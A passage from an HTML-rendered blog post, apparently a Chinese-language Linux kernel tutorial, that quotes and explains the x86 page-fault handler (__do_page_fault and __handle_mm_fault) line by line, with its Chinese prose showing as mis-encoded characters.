class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment"> * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment"> * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">local_irq_enable();</span><br><span class="line">error_code |= PF_USER;</span><br><span class="line">flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">local_irq_enable();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">flags |= FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment"> * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment"> * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment"> * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment"> * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment"> * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment"> * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment"> * listed in the exceptions table.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment"> * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment"> * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment"> * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment"> * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment"> * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment"> * down_read():</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line"><span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment"> * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment"> * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment"> * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we have a good vm_area for this memory access, so</span></span><br><span class="line"><span class="comment"> * we can handle it..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment"> * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment"> * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment"> * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment"> * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment"> * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line"><span class="comment">/* Retry at most once */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">flags |= FAULT_FLAG_TRIED;</span><br><span class="line"><span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">mm_fault_error(regs, error_code, address, fault);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment"> * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (major) &#123;</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦çŸ¥é“çš„æ˜¯<code>vma</code>è¡¨ç¤ºçš„æ˜¯çº¿æ€§åŒºæè¿°ç¬¦ï¼Œ<code>tsk</code>è¡¨ç¤ºçš„æ˜¯å¾ˆç†Ÿæ‚‰çš„<code>task_struct</code>,<code>mm</code>ä¹Ÿæ˜¯å‰é¢æ–‡ç« ä¸­æåˆ°è¿‡çš„<code>mm_struct</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡è¿™æ ·ä¸€æ¡è¯­å¥åˆå§‹åŒ–flagsï¼Œéšååˆå§‹åŒ–ä¸Šè¿°çš„å˜é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT)))&#123;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ¡è¯­å¥ä»¥åŠéªŒè¯<code>error_code</code>åˆ¤æ–­ç¼ºé¡µå¼‚å¸¸æ˜¯å¦å‘ç”Ÿåœ¨å†…æ ¸ç©ºé—´ï¼Œè€Œ<code>PF_RSVD | PF_USER | PF_PROT</code>çš„å«ä¹‰åˆ†åˆ«è¡¨ç¤º<code>é¡µè¡¨é¡¹ä¿ç•™ ï½œ ç”¨æˆ·é¡µå¼‚å¸¸ ï½œ é¡µä¿æŠ¤å¼‚å¸¸</code>ã€‚å¦‚æœåˆ¤æ–­ç»“æœè®¤å®šä¸ºå†…æ ¸åœ°å€ç©ºé—´å‘ç”Ÿçš„ç¼ºé¡µåˆ™ä½¿ç”¨<code>vmalloc_fault(address)</code>è¿›è¡Œå¤„ç†ã€‚</p><p>éšåè¿˜æ˜¯ä¸»è¦åˆ†æç”¨æˆ·æ€çš„ç¼ºé¡µå¼‚å¸¸ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡è¯†ä½åˆ™ä»£è¡¨æ˜¯é¡µè¡¨é”™è¯¯å¹¶è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥åˆ™æ˜¯éªŒè¯æ˜¯å¦å‡ºå‘äº†<code>smap</code>ä¿æŠ¤ï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒéªŒè¯äº†æ—¶å€™å¼€å¯äº†ç¼ºé¡µä¸å¤„ç†æˆ–è€…æ˜¯ä¸å­˜åœ¨ç”¨æˆ·ç©ºé—´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">  local_irq_enable();</span><br><span class="line">  error_code |= PF_USER;</span><br><span class="line">  flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">    local_irq_enable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å¯„å­˜å™¨å‘ç”Ÿç¼ºé¡µæ—¶æ˜¯å¦ä¸ºç”¨æˆ·æ€å¯„å­˜å™¨ï¼Œç´§æ¥ç€å‘é€ç»ˆç«¯è¯·æ±‚ï¼Œç„¶åè®¾ç½®<code>error_code</code>å’Œ<code>flags</code>ä¸ºç”¨æˆ·ç©ºé—´å‘ç”Ÿçš„ç¼ºé¡µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">  flags |= FAULT_FLAG_WRITE;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦æ˜¯åœ¨å†™çš„æ—¶å€™å‘ç”Ÿçš„ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™ç»™flagsæ·»åŠ ç›¸åº”çš„æ ‡è¯†ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; </span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšåå¯¹<code>mm_struct</code>ä¸Šé”ï¼Œå¦‚æœä¸Šé”å¤±è´¥å¹¶ä¸”å‘ç°æ˜¯å†…æ ¸ç©ºé—´çš„å¼‚å¸¸åˆ™æ€æ­»è¿›ç¨‹ï¼ŒæˆåŠŸåˆ™ç»§ç»­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line">  <span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">    bad_area(regs, error_code, address);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œåˆ™æ˜¯æœçº¿æœç´¢åˆ°åœ°å€å¯¹åº”çš„vmaï¼Œå¦‚æœvmaä¸å­˜åœ¨åˆ™æ€æ­»è¿›ç¨‹ã€‚å¦‚æœä½¿ç”¨çš„çº¿æ€§åœ°å€å¤§äº<code>vma-&gt;vm_start</code>åˆ™è¿›å…¥<code>good_area</code>ã€‚å¦‚æœä¸æ˜¯åˆ™è¿›å…¥ä¸‹ä¸€ä¸ªifï¼Œåˆ¤æ–­å½“å‰çš„vmaæ˜¯å¦ä¸ºå †æ ˆåŒºï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚ç´§æ¥ç€éªŒè¯æ˜¯å¦ä¸ºç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µï¼Œå¦‚æœæ˜¯åˆ™ç´§æ¥ç€æ˜¯å¯¹æ ˆçš„ä¸€ä¸ªåˆ¤æ–­ã€‚åç»­åˆ™æ˜¯å¢é•¿çº¿æ€§åŒºï¼Œå¦‚æœå¤±è´¥ä¹Ÿæ€æ­»è¿›ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåˆ°è¿™é‡Œå…ˆæ˜¯åˆ¤æ–­ä¸€ä¸‹<code>error_code</code>ä¸vmaæ˜¯å¦å†²çªï¼Œå¦‚æœä¸å†²çªåˆ™è¿›å…¥åˆ†é…ç‰©ç†é¡µçš„æ ¸å¿ƒå‡½æ•°<code>handle_mm_fault</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">    flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">    flags |= FAULT_FLAG_TRIED;</span><br><span class="line">    <span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­æ˜¯å¦éœ€è¦å……å®ï¼Œå¦‚æœéœ€è¦é‡è¯•ï¼Œé‚£ä¹ˆè¿›ä¸€æ­¥åˆ¤æ–­åœ¨å¼€å§‹åˆå§‹åŒ–çš„flagsä¸­æ˜¯å¦åŒ…å«æ ‡å¿—ä½<code>FAULT_FLAG_ALLOW_RETRY</code>ï¼Œå¦‚æœæœ‰çš„è¯åˆ™è¿›è¡Œå……å®ï¼Œå¹¶ä¸”æ“¦å‡ºæ‰flagsä¸­çš„å…è®¸å……å®æ ‡è¯†ä¸ºï¼Œå¹¶ä¸”æ·»åŠ <code>FAULT_FLAG_TRIED</code>æ ‡å¿—ä½ã€‚</p><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a><strong>handle_mm_fault</strong></h4><p>è¿™ä¸ªå‡½æ•°çš„ä¸­çš„çœŸæ­£å¤„ç†å‡½æ•°å…¶å®æ˜¯<code>__handle_mm_fault</code>ï¼Œæ‰€ä»¥ç›´æ¥çœ‹å…¶ä¸­çš„è¿™ä¸ªå‡½æ•°å§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pgd_t</span> *pgd;</span><br><span class="line"><span class="keyword">pud_t</span> *pud;</span><br><span class="line"><span class="keyword">pmd_t</span> *pmd;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line"><span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">pgd = pgd_offset(mm, address);</span><br><span class="line">pud = pud_alloc(mm, pgd, address);</span><br><span class="line"><span class="keyword">if</span> (!pud)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">pmd = pmd_alloc(mm, pud, address);</span><br><span class="line"><span class="keyword">if</span> (!pmd)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment"> * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment"> * is done, and goto retry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">orig_pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">      orig_pmd, dirty);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment"> * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment"> * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment"> * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment"> * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment"> * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pte = pte_offset_map(pmd, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡çœ‹è¿‡æˆ‘å‰é¢é‚£ç¯‡æ–‡ç« çš„éƒ½ä¸ä¼šé™Œç”Ÿ<code>pgd | pud | pmd | 